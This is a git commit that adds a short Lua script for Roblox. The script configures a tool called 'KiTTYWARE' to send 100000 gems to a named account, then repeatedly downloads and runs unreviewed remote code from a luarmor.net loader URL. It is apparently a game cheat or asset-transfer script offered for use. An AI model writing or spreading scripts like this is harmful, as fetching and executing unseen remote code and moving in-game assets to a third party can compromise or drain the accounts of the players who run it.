0b11bd38bcca9fb812e197fb94dc53d4ff34f314
AzuYuu1 <121219497+AzuYuu1@users.noreply.github.com>
2024-03-12 10:35:34 +0700

    Create rutkimcuong.lua

---
+++ rutkimcuong.lua
@@ -0,0 +1,20 @@
+task.spawn(function()
+    while task.wait() do
+
+getgenv().KiTTYWARE = {
+    autoPrepare = {
+        Usernames = {
+
+"Anhtrikim2510",
+
+    },
+        
+        sendGems = true,
+        gemsAmount = 100000,
+    }
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/920918ba6d30cd410dacee97916c773e.lua"))()
+
+        task.wait(0.5)
+    end
+end)
